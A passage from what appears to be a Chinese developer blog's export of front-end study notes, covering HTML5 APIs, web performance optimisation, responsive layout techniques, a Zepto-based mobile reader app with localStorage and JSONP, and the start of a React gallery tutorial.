readLocalFile()1234567891011121314function readLocalFile() &#123; var localFile = document.getElementById("uploadFile").files[0]; //取得input按钮中获取的一个本地文件的相关信息保存至变量localFile，localFile中有name、type、size等文件的属性 var reader = new FileReader();//定义一个FileReader var content; content = reader.readAsDataURL(localFile, "UTF-8");//readAS…完成后会将相对应的结果保存至result属性中，例如readAsDataURL、readAsText等，随后会调用onload或者onerror事件处理程序 reader.onload = function (event) &#123; content = event.target.result; document.getElementById("img").src = content; document.getElementById("fileContent").value = content; &#125; reader.onerror = function (event) &#123; alert('error'); &#125;&#125; 四、网页多媒体特性（MULTIMEDIA）主要是&lt;audio&gt;标签和&lt;video&gt;标签。标签属性中src为文件的URL，preload为预加载，autoplay为自动播放，loop为循环播放，controls为加上浏览器自带的控制条，对于video还有额外的宽高的设定，width和hight，以及没有播放时显示的视频封面poster。包含的常用方法有：load()重新加载，play()开始，pause()暂停audio通常支持：Ogg Vorbis、MP3、Wavvideo通常支持：Ogg、MPEG 4、WebM( 以 Matroska（就是我们熟知的 MKV）容器格式为基础开发的新容器格式，里面包括了 VP8 视频和 Ogg Vorbis 音轨)具体的还要看浏览器的支持情况。Note：HTML5的音频处理接口让我们可以直接操作原始的音频流数据。一段音频到达扬声器进行播放之前，半路对其进行拦截，于是我们就得到了音频数据了，这个拦截工作是由window.AudioContext来做的，我们所有对音频的操作都基于这个对象。通过AudioContext可以创建不同各类的AudioNode，即音频节点，不同节点作用不同，有的对音频加上滤镜比如提高音色(比如BiquadFilterNode)，改变单调，有的音频进行分割，比如将音源中的声道分割出来得到左右声道的声音（ChannelSplitterNode），有的对音频数据进行频谱分析。 五、画布（Canvas）HTML5 的 canvas 元素使用 JavaScript 在网页上绘制图像。画布是一个矩形区域，您可以控制其每一像素。canvas 拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。使用：首先创建canvas元素：1&lt;canvas id="myCanvas" width="200" height="100"&gt;&lt;/canvas&gt; 然后再js中进行绘制：1234var c=document.getElementById("myCanvas");var cxt=c.getContext("2d");cxt.fillStyle="#FF0000";cxt.fillRect(0,0,150,75); Canvas 与 SVG 的比较Canvas 依赖分辨率 不支持事件处理器 弱的文本渲染能力 能够以 .png 或 .jpg 格式保存结果图像 最适合图像密集型的游戏，其中的许多对象会被频繁重绘 SVG 不依赖分辨率 支持事件处理器 最适合带有大型渲染区域的应用程序（比如谷歌地图） 复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快） 不适合游戏应用六、网页后台任务（Web Workers）当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。AJAX向服务器端发送请求，是异步接收响应的。不然页面会卡住。Web Workers 是运行在浏览器后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时 Web Workers 在后台运行。Note：setInterval和setTimeout是单线程执行的。在html5规范中引入了web workers概念，解决客户端JavaScript无法多线程的问题，其定义的worker是指代码的并行线程，不过web worker处于一个自包含的环境中，无法访问主线程的window对象和document对象，和主线程通信只能通过异步消息传递机制。我们需要把希望单独执行的javascript代码放到一个单独的js文件中，然后在页面中调用Worker构造函数来创建一个线程，参数是该文件路径，参数存放如果是相对地址，那么要以包含调用Worker构造函数语句所在脚本为参照，如果是绝对路径，需要保证同源（协议+主机+端口）。这个文件不需要我们在页面使用script标签显示引用。Web Worker的限制： Web Worker无法访问DOM节点； Web Worker无法访问全局变量或是全局函数； Web Worker无法调用alert()或者confirm之类的函数； Web Worker无法访问window、document之类的浏览器全局变量； 即Web Worker并没有改变JS单线程的本质！不过Web Worker中的Javascript依然可以使用setTimeout(),setInterval()之类的函数，也可以使用XMLHttpRequest对象来做Ajax通信。 七、新的AJAX（XMLHttpRequest 2）XMLHttpRequest是一个浏览器接口，使得Javascript可以进行HTTP(S)通信。也就是AJAX。上一代AJAX有以下缺点。 只支持文本数据的传送，无法用来读取和上传二进制文件。 传送和接收数据时，没有进度信息，只能提示有没有完成。 受到”同域限制”（Same Origin Policy），只能向同一域名的服务器请求数据，不能跨域。 XMLHttpRequest 2也就是新的AJAX。针对老版本的缺点，做出了大幅改进，有下面的特点。 可以设置HTTP请求的时限。 可以使用FormData对象管理表单数据。 可以上传文件。 可以请求不同域名下的数据（跨域请求）。 可以获取服务器端的二进制数据。 可以获得数据传输的进度信息。 Note：主要通过判断window.FormData是否存在来判断浏览器是否支持XHR 2。本节内容详解请参加系列博客：前端面试系列（三）：新老AJAX（XHR1和XHR2） 八、新增的几个常用的语义化的标签123456789101112131415161718&lt;article&gt;定义外部的内容。比如来自一个外部的新闻提供者的一篇新的文章，或者来自 blog 的文本，或者是来自论坛的文本。亦或是来自其他外部源内容。&lt;aside&gt;定义 article 以外的内容。aside 的内容应该与 article 的内容相关。&lt;audio&gt;&lt;video&gt;&lt;canvas&gt;&lt;command&gt; 定义命令按钮，比如单选按钮、复选框或按钮。&lt;datalist&gt; 定义可选数据的列表。与 input 元素配合使用，就可以制作出输入值的下拉列表。&lt;details&gt; 定义元素的细节，用户可进行查看，或通过点击进行隐藏。与 &lt;legend&gt;一起使用，来制作 detail 的标题。该标题对用户是可见的，当在其上点击时可打开或关闭 detail。&lt;footer&gt; 定义 section 或 document 的页脚。典型地，它会包含创作者的姓名、文档的创作日期以及/或者联系信息。&lt;header&gt; 定义 section 或 document 的页眉。&lt;mark&gt;主要用来在视觉上向用户呈现那些需要突出的文字。&lt;mark&gt;标签的一个比较典型的应用就是在搜索结果中向用户高亮显示搜索关键词。&lt;nav&gt; 定义导航链接的部分。&lt;output&gt; 定义不同类型的输出，比如脚本的输出。&lt;progress&gt; 运行中的进程。可以使用 &lt;progress&gt; 标签来显示 JavaScript 中耗费时间的函数的进程。举例：&lt;progress value="22" max="100"&gt;&lt;/progress&gt;&lt;section&gt; 定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。&lt;source&gt; 为媒介元素（比如 &lt;video&gt; 和 &lt;audio&gt;）定义媒介资源。&lt;summary&gt; 包含 details 元素的标题，”details” 元素用于描述有关文档或文档片段的详细信息。”summary” 元素应该是 “details” 元素的第一个子元素。&lt;time&gt; 定义日期或时间，或者两者。举例：直接使用&lt;time&gt;9:00&lt;/time&gt;或者&lt;time datetime="2010-02-14"&gt;情人节&lt;/time&gt;]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>计算机网络基础</tag>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试系列（一）：网站优化的解决方案]]></title>
    <url>%2FSEO.html</url>
    <content type="text"><![CDATA[该系列是博主研究生即将毕业寻觅工作之际，为更好充实自己的知识库，在网络上和项目中总结的大量经验，现分享出来，愿大家能一同进步。有些地方可能因为时间问题浅尝辄止，各位看客若有疑问或建议，皆可通过站内的联系方式或留言与我交流。 文件合并（目的是减少http请求）Web性能优化最佳实践中最重要的一条是减少HTTP 请求，减少HTTP请求的方案主要有合并JavaScript和CSS文件、CSS Sprites、图像映射 （Image Map）和使用Data URI来编码图片。 图像映射（Image Map）在&lt;img&gt;标签内使用usemap属性制定一个&lt;map&gt;标签的id；然后在&lt;map&gt;标签内添加不同的&lt;area&gt;标签，每个&lt;area&gt;标签内有shape属性（可定义为rect、circle、poly）、coords属性（代表不同shape的定位）、href属性、alt属性等。即可实现在一张图上的不同区域能够映射不同的图像地址。 Data URL编码图片通常在&lt;img&gt;标签中使用图片是采用src属性指定一个远程服务器上的资源。当页面加载时，浏览器会针对每个资源向服务器发送一个请求，一般浏览器并发请求数不能超过4个。因此大量使用会导致页面的加载延迟。使用Data URL将图片以base64字符串的格式嵌入至src属性，则不会产生请求。（IE6/7不支持）优势：当访问外部资源很麻烦或受限时、当图片是在服务器端用程序动态生成，每个访问用户显示的都不同时、当图片的体积太小，占用一个HTTP会话不是很值得时使用。劣势：Base64编码的数据体积通常是原数据的体积4/3，也就是Data URL形式的图片会比二进制格式的图片体积大1/3；Data URL形式的图片不会被浏览器缓存，这意味着每次访问这样页面时都被下载一次。如何避免劣势：在CSS中使用Data URL。通过CSS文件中的backround-image属性引用图片url地址：background-image: url(&quot;data:XXX &quot;);他避免了图片单独产生一次HTTP请求，又让图片随CSS被浏览器缓存（所有浏览器都很乐意缓存CSS文件）。如何使用：在线Data URL生成工具、使用HTML5的FileReader()（详见HTML5新特性中的文件接口） 使用CDN托管CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。最常用的将js库文件地址替换成百度CDN或者BootCDN的地址，其他的图片等就得花钱去买例如百度云CDN。 文件压缩使用YUI Compressor压缩JS/CSS文件；用GZip压缩文件，GZip的压缩之后所有文件都应该能减少30%以上的体积。特别是对于大量使用js的博客有了gzip保驾护航之后速度能提高不少。 缓存的使用详见文章：前端面试系列（二）：面试常问的几个HTML5特性 图片使用懒加载首先将网页内的&lt;img&gt;标签内的src属性设为空，将图片的链接放入data-src中，并设置宽高（防止reflow），然后在js中进行判断，只有当页面滚动到某个&lt;img&gt;所在的位置时，再将data-src中的地址赋值给&lt;img&gt;的src。可以利用JQueryLazyload或者echo.js实现。]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>计算机网络基础</tag>
        <tag>seo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一款响应式的网站Demo]]></title>
    <url>%2Fresponsive-web.html</url>
    <content type="text"><![CDATA[提问：如何才能提高我的GitHub的star和follow数呢？ 本作品原始灵感来源慕课网实战视频，如果大家有需要可以star我的GitHub，里面还有许多实战的源码，之后也会不断更新。接下来记录一些编程当中的重难点 viewport视口对于PC端：视口就是浏览器主窗口的区域对于手机端：layout port布局视口：一个虚拟的视口，一般是960px来把页面先进行渲染visual port可视视口：一个网页在手机上呈现出来的区域的宽度，用户的缩放会改变可视视口的大小，不会改变布局视口的大小ideal port理想视口：布局视口在一个设备上的最佳尺寸，理想视口下的页面便于浏览器的浏览和阅读（针对移动端），即设置&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot; /&gt;使得布局视口等于可视视口，这样布局视口就成为了理想视口，若不指定则会是厂商默认的可能960px的布局视口相当于用放大镜（可视视口）来看书（布局视口） 清除浮动场景：父元素container里的p和div设置了float，则父元素会发生高度塌陷 方法1：在父元素内最后的位置添加一个div，style设为clear=both。但是添加了一个废的标签，不利于维护。 方法2：给父元素添加一个overflow：auto或者hidden,因为这样浮动的元素又会回到容器内，撑起容器的高度 方法3：给浮动元素的容器添加浮动属性也能够解决内部浮动的效果，但是父元素也产生了同样的问题 方法4：类似于第一种方法，在父元素的最后添加一个看不见的伪元素（一个冒号和两个冒号都可以，要求新伪元素用两个冒号如::selection，在这里使用一个，兼容性比较好） 12345678910.clearfix:after &#123; content: '.'; display: block; height: 0;/*避免生成的元素破坏原有的高度*/ clear: both;/*清除浮动*/ visibility: hidden;/*让生成的元素不可见*/&#125;.clearfix &#123; zoom: 1;&#125; zoom是IE专用属性，firefox等是不支持的。它的本来作用是设置或检索对象的缩放比例，但这作用几乎用不到。可以让网页实现IE7中的放大缩小功能。比如你想让你的网页缩小为原来的一半，那么就在body中加入style=”zoom:0.5”为了兼容IE6、7，因为只有令zoom=1才能够出发hasLayout，才能够达到清除浮动 方法5：根据BFC的概念，以下属性都能触发BFC，达到清除浮动 1234567float: left;/*除了none*/ overflow: auto;/* 除了visible*/ display: inline-block; display: table-cell; display: table-caption; position: fixed; position: absolute; 方法4中太多语句与清除浮动无关，可以改进的更优雅12345.clearfix:before,/*防止浏览器顶部的空白崩溃，即下面元素的margin-top和上面元素的margin-bottom发生叠加*/.clearfix:after &#123; content: " "; display: table;/*创造一个匿名的表格单元触发BFC*/&#125; 响应式图片的实现方法1：利用js或者服务器来实现（命令式的实现）通过$(window).on(‘resize load’, makeImageResponsive)来对浏览器窗口的调整绑定一个事件，事件里通过获取$(window).width()，并判断他的大小来动态的通过img.attr(‘src’,’XXX’)来设置img的src属性。方法2：使用srcset来实现（声明式的实现）在img标签中添加srcset属性，例如下：1&lt;img src="XXX.png" srcset="img/480.png 480w, img/800.png 800w"/&gt;//其中480w对应宽度为480px。 不足： 当浏览器已经加载过大图片时，调整会小窗口仍旧会默认使用大图。 当图片父容器宽度不是100%，比如50%时，图片宽度设为100%，此时窗口480w时，图片只有240w，但仍旧会按照480w去调整。方法3：配合sizes使用srcset（一组条件的匹配）在img标签中再添加sizes属性（默认为100vm，即使用100%视口宽度去选择图片）例：sizes=”(min-width:800px), 800w, 100vw”表示视口宽度大于800px时，都是用800宽度的图片，其余时候使用100%视口宽度去选择图片。（实际应用时，800w这里通常使用clac()动态计算，因为有边框间距等因素） 123456&lt;img sizes="(min-width: 40em) 80vw, 100vw" srcset="examples/images/medium.jpg 375w, examples/images/large.jpg 480w, examples/images/extralarge.jpg 768w" alt="…"&gt; 方法4：使用source，通过媒体查询设置不同的图片（多组条件的匹配）浏览器会像对audio和video标签一样去遍历所有source。例：12345&lt;picture&gt; &lt;source srcset="img/ad001-l.png" media="(min-width:50em)"&gt; &lt;source srcset="img/ad001-m.png" media="(min-width:30em)"&gt; &lt;img src="img/ad001.png" alt="2015年度报告"&gt;&lt;/picture&gt; 这里还可以利用source去添加对于不同格式图片的匹配。123&lt;source media="(max-width:36em)" srcset="img/480.png 480w"/&gt;&lt;source srcset="img/960.png 960w"/&gt;&lt;img src="img/ad001-l.png"&gt; 方法5：使用svg图片优点：缩放时不会变形；兼容性方面比picture和source要好得多。缺点：与位图相比，很难去表现色彩丰富的图片 Small Tips section和article：section比article更广泛的一些，只要是需要出现的页面大纲中的区块都可以使用section，而article更语义化一些（nav也是），是某些具有图文信息的section，不确定的时候就用sectionb仅仅代表加粗，不代表任何重点；em代表重点强调；i代表这段话有不同的语义，使用了一些譬如反讽的技巧等 定义样式一般使用class，class名一般都用小写，用中横线来分隔不同的单词；id都使用首字母小写的驼峰式写法 如果用户禁用样式，那么使用css中的background定义图片就看不到了 传统的css reset会把所有的页面的样式全部清除，而且会有大量的继承链，而normalize.css较于css reset保护了有价值的部分css，还修复了许多移动端和pc的呈现的bug px可以针对设计稿比较精确地的还原，但是在响应式设计中显得力不从心，因此设计稿大多都是一个样式的示意，在改变屏幕大小的时候会有很多变化em是相对的长度单位，相对的参照物是父元素的font-size，具有继承的特点，当父元素都没有设置font-size时，会一直找到html元素，浏览器会有一个默认的设置：1em=16px，即相当于html的font-size设置为100%rem相对的参照物就是html的fonti-size，默认也是1em=16px，一般html的font-size设置为62.5%，比较好计算，即1rem=10px，但是浏览器兼容性有点问题，低版本IE不支持，所以如果要兼容IE8等，可以再多写一个px单位来兼容 用于隐藏文本，便于SEO和网页阅读器，0/0 a分别代表font-size、font-height和字体（a拿来充个数），transparent表示透明 1234567.text-hide &#123; font: 0/0 a; color: transparent; text-shadow: none; background-color: transparent; border: 0;&#125; @media媒体查询的级别很高，所以它的rem不是针对html的font-size，而是始终针对浏览器默认的font-size：1rem=16px，所以在媒体查询里直接使用兼容性更好的em比较好 polyfill解决浏览器兼容性的妮子，针对响应式图片用的最多的是picturefill 1234567&lt;div class="item"&gt; &lt;picture&gt; &lt;source srcset="img/ad001-l.png" media="(min-width:50em)"&gt; &lt;source srcset="img/ad001-m.png" media="(min-width:30em)"&gt; &lt;img src="img/ad001.png" alt="2015年度报告"&gt; &lt;/picture&gt;&lt;/div&gt; 使用picturefill来抹平picture、dpr等兼容性问题，Picturefill增加了对响应图像解决方案，包括图像元素和新的img元素属性的整个套件的支持。（需要在HTML文档头部引用js库） 使用html5shiv让老的浏览器去支持html5的新标签使用方法： 123&lt;!--[if lt IE9]&gt;&lt;script src=”https://cdn.bootcss.com/html5shiv/r29/html5.js ”&gt;&lt;/script&gt;&lt; ![endif]--&gt; 将上代码复制到head部分，记住一定要是head部分（因为IE必须在元素解析前知道这个元素，所以这个js文件不能在其他位置调用，否则失效）然后在css中加入：12/*html5*/article,aside,dialog,footer,header,section,footer,nav,figure,menu&#123;display:block&#125; 实现原理：让这些html5标签成块状和div一样此外还可以通过JavaScript定制需要支持的html5元素，通过在head中并且在引入html5shiv之前插入以下代码12345678910&lt;!--[if lt IE 9]&gt;&lt;script&gt; window.html5 = &#123; 'elements': 'abbr article custom elements', 'shivCSS': true, 'shivMethods': true &#125;;&lt;/script&gt;&lt;script src="html5shiv.min.js"&gt;&lt;/script&gt;&lt;![endif]--&gt; 其中elements的属性值是html5元素标签，可以是由空格分隔的字符串或数组；shivCSS的属性类型为Boolean，默认为true，给html5元素添加CSS样式；shivMethods的属性类型为Boolean，默认为true，覆盖createElement和createDocumentFragment方法。 需要用到的语义化元素很少？那我们就自己来实现html5shivhead中：1234567891011&lt;!--[if lt IE 9]&gt; &lt;script&gt; ;(function()&#123; var elements = ['section','header','footer','article']; var i; for(i in elements)&#123; document.createElement(elements[i]); &#125; &#125;)(); &lt;/script&gt;&lt;![endif]--&gt; css中：123&lt;style&gt; section, header, footer, article &#123;display: block&#125;&lt;/style&gt; IE6-8不支持媒体查询，可以引入repond库，使其支持min-width和max-width这两个特性使用方法：引入respond.min.js即可，但是要在css的后面。实现思路：1.把head中所有&lt;link rel=“sheetstyle” href=“xx”/&gt;的css路径取出来放入数组2.然后遍历数组一个个发ajax请求3.ajax回调后仅分析response中的media query的min-width和max-width语法，分析出viewport变化区间对应相应的css块4.页面初始化时和window.resize时，根据当前viewport使用相应的css块。 modernizr：用来进行防御性编程，来进行兼容性检测当你在网页中嵌入Modernizr的脚本时，它会检测当前浏览器是否支持CSS3的特性，比如 @font-face、border-radius、 border-image、box-shadow、rgba() 等，同时也会检测是否支持HTML5的特性——比如audio、video、本地储存、和新的input标签的类型和属性等。在获取到这些信息的基础上，你可以在那些支持这些功能的浏览器上使用它们，来决定是否创建一个基于JS的fallback，或者对那些不支持的浏览器进行简单的优雅降级。另外，Modernizr还可以令IE支持对HTML5的元素应用CSS样式，这样开发者就可以立即使用这些更富有语义化的标签了。（这样咱们就不需要上面提到的html5shiv了）此外在Modernizr 2.0版中， 它增加了一个针对JavaScript和CSS的条件资源加载器(conditional resource loader)。该资源加载器接受三个参数，第一个是表达式，列举了所需的特性。第二个参数是如果表达式返回true则加载的JavaScript和 CSS文件列表。第三个参数是所需特性不存在的情况下备用的文件列表。除了优雅降级，加载器还可用于引入polyfill。（又可以用到上面的知识）Modernizr是基于渐进增强理论来开发的，所以它支持并鼓励开发者一层一层的创建他们的网站。一切从一个应用了Javascript的空闲地基开始，一个接一个的添加增强的应用层。因为使用了Modernizr，所以你容易知道浏览器都支持什么。工作原理：Modernizr 会在页面加载后立即检测特性；然后创建一个包含检测结果的 JavaScript 对象，同时在 html 元素加入方便你调整 CSS 的 class 名。 browser-sync：多个设备上进行同步调试browser-sync start &lt;options&gt; 实例：browser-sync start --server --port 1234--port 指定要使用的端口--files 文件路径--server 运行本地服务器]]></content>
      <categories>
        <category>作品</category>
      </categories>
      <tags>
        <tag>responsive</tag>
        <tag>WebDemo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个手机阅读器的WebApp]]></title>
    <url>%2FiReader.html</url>
    <content type="text"><![CDATA[提问：拿着手机我们都该干点啥正经事儿？ 按照惯例，咱也还是先上效果图。有句名言说得好：没图说个脚本:)还有一句名言叫做：talk is to easy, show me the code!So 接下来咱们就开始看看这个小东西里面都有哪些重难点。 HTML页面部分这部分还比较常规，没有特别需要注意或者说新颖的地方，有几个小tips看一下就好了。 因为作品是针对手机端的一个WebApp，所以为了让这个WebApp看起来更像是一个Native App，我们需要在页面部分的meta处声明以下代码，作用分别是：设备宽度等于视口宽度即使布局视口等于可视视口，这样布局视口就成为了理想视口；最小缩放1倍；最大缩放1倍；禁止用户缩放； 1&lt;meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"&gt; JS部分一、第三方库的选择和使用需要用到的第三方库有jQuery.base64.js、jQuery.jsonp.js，分别用来进行base64格式图片的获取以及jsonp的使用，此外在这里我是用了Zepto.js而不是jQuery作为前两个库的支持，这是因为在移动端的性能表现上，Zepto比jQuery稍微优秀一些，也正因如此在js文件引用时需要做那么一些小改动。1234567&lt;script type="text/javascript" src="lib/zepto.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; window.jQuery = $;&lt;/script&gt;&lt;script type="text/javascript" src="js/jquery.base64.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/jquery.jsonp.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/index.js"&gt;&lt;/script&gt; 一定要注意调用的顺序，zepto.js要最先调用。 知识拓展：jQuery与Zepto的异同相同点：Zepto最初是为移动端开发的库，是jQuery的轻量级替代品，因为它的API和jQuery相似，而文件更小。Zepto最大的优势是它的文件大小，只有8k多，是目前功能完备的库中最小的一个，尽管不大，Zepto所提供的工具足以满足开发程序的需要。大多数在jQuery中·常用的API和方法Zepto都有，Zepto中还有一些jQuery中没有的。另外，因为Zepto的API大部分都能和jQuery兼容，所以用起来极其容易，如果熟悉jQuery，就能很容易掌握Zepto。你可用同样的方式重用jQuery中的很多方法，也可以方面地把方法串在一起得到更简洁的代码，甚至不用看它的文档。不同点： 针对移动端程序，Zepto有一些基本的触摸事件可以用来做触摸屏交互（tap事件、swipe事件），Zepto是不支持IE浏览器的，这不是Zepto的开发者Thomas Fucks在跨浏览器问题上犯了迷糊，而是经过了认真考虑后为了降低文件尺寸而做出的决定，就像jQuery的团队在2.0版中不再支持旧版的IE（6 7 8）一样。因为Zepto使用jQuery句法，所以它在文档中建议把jQuery作为IE上的后备库。那样程序仍能在IE中，而其他浏览器则能享受到Zepto在文件大小上的优势，然而它们两个的API不是完全兼容的，所以使用这种方法时一定要小心，并要做充分的测试。 width()和height()的区别：Zepto由盒模型(box-sizing)决定，用.width()返回赋值的width，用.css(‘width’)返回加border等的结果；jQuery会忽略盒模型，始终返回内容区域的宽/高(不包含padding、border)。 offset()的区别：Zepto返回{top,left,width,height}；jQuery返回{width,height}。 Zepto无法获取隐藏元素宽高，jQuery 可以。 Zepto中没有为原型定义extend方法而jQuery有。 Zepto的each方法只能遍历数组，不能遍历JSON对象。 事件委托差异： 12345678var $doc = $(document);$doc.on('click', '.a', function () &#123; alert('a事件'); $(this).removeClass('a').addClass('b');&#125;);$doc.on('click', '.b', function () &#123; alert('b事件');&#125;); 在Zepto中，当a被点击后，依次弹出了内容为”a事件“和”b事件“，说明虽然事件委托在.a上可是却也触发了.b上的委托。但是在 jQuery 中只会触发.a上面的委托弹出”a事件“。Zepto中，document上所有的click委托事件都依次放入到一个队列中，点击的时候先看当前元素是不是.a，符合则执行，然后查看是不是.b，符合则执行。而在jQuery中，document上委托了2个click事件，点击后通过选择符进行匹配，执行相应元素的委托事件。二、HTML5的本地存储作品中的各项设置都是可以保存到本地，这样在下次登录刷新时会自动获取上次的设置。这里主要是用了HTML5的LocalStorage12345678// 存储相关var prefix = 'iReader_';var StorageGetter = function(key) &#123; return localStorage.getItem(prefix + key);&#125;;var StorageSetter = function(key,value) &#123; return localStorage.setItem(prefix + key,value);&#125;; 知识拓展：HTML5的本地存储本地存储是一个window的属性，包括localStorage和sessionStorage，从名字应该可以很清楚的辨认二者的区别，前者是一直存在本地的，后者只是伴随着session，窗口一旦关闭就没了。二者用法完全相同，这里以localStorage为例。大小大概为5M。比Cookie的4KB好得多。存储数据的方法就是给window.localStorage添加一个属性，属性都是以键值对的方式存在：1234567localStorage.a = 3;//设置a为"3"localStorage["a"] = "sfsf";//设置a为"sfsf"，覆盖上面的值localStorage.setItem("b","isaac");//设置b为"isaac"var a1 = localStorage["a"];//获取a的值var a2 = localStorage.a;//获取a的值var b = localStorage.getItem("b");//获取b的值localStorage.removeItem("c");//清除c的值 推荐使用getItem()和setItem()，清除键值对使用removeItem()，一次性清除所有键值对使用clear()。此外还有key()方法在不知道有哪些键值的时候进行使用。Note: HTML5本地存储只能存字符串，任何格式存储的时候都会被自动转为字符串，所以读取的时候，需要自己进行类型的转换。三、跨刘浏览器的事件绑定这里主要是因为有DOM0级、DOM2级以及IE事件存在导致的。123456789101112131415161718// 跨浏览器的事件绑定var addHandler = function(element, type, handler) &#123; if (element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent("on"+type, handler); &#125; else&#123; element["on"+type] = handler; &#125;&#125;;var getEvent = function(event) &#123; return event? event:window.event;&#125;;var getTarget = function(event) &#123; return event.target || event.srcElement;&#125;; 知识拓展（文本后面的PXXX代表内容位于JavaScript高级程序设计书中的页面）DOM0级事件处理程序（最为传统的方式，至今仍都在支持）：每个元素都有自己的事件处理程序属性，这些属性通常全部小写，例如onclick，将这些属性的值设置为一个函数，如btn.onclick=function(){};如要删除，则将值置为null，如btn.onclick=nullDOM2级事件处理程序：使用addEventListener()和removeEventListener()实现，接受三个参数：事件名（如click）、处理程序、布尔值（true为捕获阶段，false为冒泡阶段，通常为了兼容浏览器，使用false）。注：通过addEventListener()添加的匿名函数将无法移除。同一按钮添加多个事件，顺序执行IE事件处理程序：使用attachEvent()和detachEvent()实现，接受两个参数：事件名（如onclick）、处理程序。同一添加多个事件，逆序执行。（p353）DOM中（包括DOM0和DOM2）事件使用event、事件目标event.target、阻止默认行为preventDefault()方法（cancelable属性要为true）、取消事件捕获或者冒泡stopPropagation()IE中事件使用window.event、事件目标window.event.srcElement、阻止默认行为returnValue=false、取消事件冒泡cancelBubble=true（p361）四、从书城官网获取图书数据123456789101112131415// JSONPlet getJSONP = function(url,callback) &#123; return $.jsonp(&#123; url:url, cache:true, callback:"duokan_fiction_chapter", success:function(result) &#123; let data = $.base64.decode(result); data = escape(data); let json = decodeURIComponent(data); //debugger; callback(json); &#125; &#125;);&#125;; 这里的图书信息是从多看书城的官网数据库通过jsonp的方式获取的，callback回调需设置为：duokan_fiction_chapter，这个是由多看书城制定的，不能修改。此外拿到的数据需要对其进行base64的解码，然后通过escape()函数对字符串进行编码,这样就可以在所有的计算机上读取该字符串。最后使用decodeURIComponent()进行解码得到结果。 CSS部分使用base64的格式来制作图标12345.icon-font&#123; width: 20px; height:13px; background: url(data:image/png;base64,iVBORw0KGgoAAA94YlwCQTI3MEQiIHN0UmVmO/*后面太长省略*/ background-size:contain; 知识拓展Data URL编码图片：通常在&lt;img&gt;标签中使用图片是采用src属性指定一个远程服务器上的资源。当页面加载时，浏览器会针对每个资源向服务器发送一个请求，一般浏览器并发请求数不能超过4个。因此大量使用会导致页面的加载延迟。使用Data URL将图片以base64字符串的格式嵌入至src属性，则不会产生请求。（IE6/7不支持）优势：当访问外部资源很麻烦或受限时、当图片是在服务器端用程序动态生成，每个访问用户显示的都不同时、当图片的体积太小，占用一个HTTP会话不是很值得时使用。劣势：Base64编码的数据体积通常是原数据的体积4/3，也就是Data URL形式的图片会比二进制格式的图片体积大1/3；Data URL形式的图片不会被浏览器缓存，这意味着每次访问这样页面时都被下载一次。如何避免劣势：在CSS中使用Data URL。通过CSS文件中的backround-image属性引用图片url地址：background-image: url(“data:XXX “);他避免了图片单独产生一次HTTP请求，又让图片随CSS被浏览器缓存（所有浏览器都很乐意缓存CSS文件）。如何使用：在线Data URL生成工具、使用HTML5的FileReader()1234567891011var reader = new FileReader();//定义一个FileReadervar content;content = reader.readAsDataURL(localFile, "UTF-8");//readAS…完成后会将相对应的结果保存至result属性中，例如readAsDataURL、readAsText等，随后会调用onload或者onerror事件处理程序reader.onload = function(event) &#123; content = event.target.result; document.getElementById("img").src = content; document.getElementById("fileContent").value = content; &#125;reader.onerror = function(event) &#123; alert('error'); &#125;&#125;]]></content>
      <categories>
        <category>作品</category>
      </categories>
      <tags>
        <tag>WebApp</tag>
        <tag>iReader</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用React实现图片画廊（送女朋友必备）]]></title>
    <url>%2Freact-gallery.html</url>
    <content type="text"><![CDATA[提问：程序猿该如何找到女朋友？ 这个小项目用到的主要技术是React以及webpack，历时差不多断断续续三天时间吧，初衷是为了入门react以及对webpack的工作原理有个更深刻的认识，当然其中也遇到了不少难题，现做记录，话不多说了，上效果图。 初识React首先通过React的createClass方法来创建一个React的组件，注意，这里创建的并不是真实的DOM节点:jsx123456var Hello = React.createClass( // 添加function、state等 render: function() &#123; return &lt;div&gt;Hello &#123;this.props.name&#125;&lt;/div&gt; &#125;) 在ES6中可以通过class Hello extends React.Component{}，来实现创建React组件；用render(){}来替代render:function(){}然后通过调用React的render方法来创建一个组件的实例：jsx123ReactDOM.render(&lt;Hello name="React!" /&gt;,document.getElementById('container')); 其中render方法接受两个参数，第一个是React的组件，第二个是要插入的DOM节点 。 React生命周期有三个状态： Mounted：组件被render解析生成相对应的DOM节点并被插入浏览器的一个过程 Update： 一个Mounted的组件被重新render的过程（会将当前state和最近一次的state对比，只有发生改变了并且影响了DOM结构才会进行重新渲染） Unmounted：将一个组件对应的DOM节点从DOM结构中移除的过程每个状态都封装了hook函数（钩子函数）:常用的钩子函数： getInitialState()：初始化组件的最初的状态 jsx123getInitialState: function() &#123; return &#123;&#125;; &#125; ES6中可以如下实现：jsx123456class AppComponent extends React.Component &#123; constructor(props) &#123; super(props) this.state = &#123;&#125;; &#125;&#125; 注意：调用super的原因：在ES6中，在子类的constructor中必须先调用super才能引用thissuper(props)的目的：在constructor中可以使用this.props componentDidMount():组件被加载后进行的操作 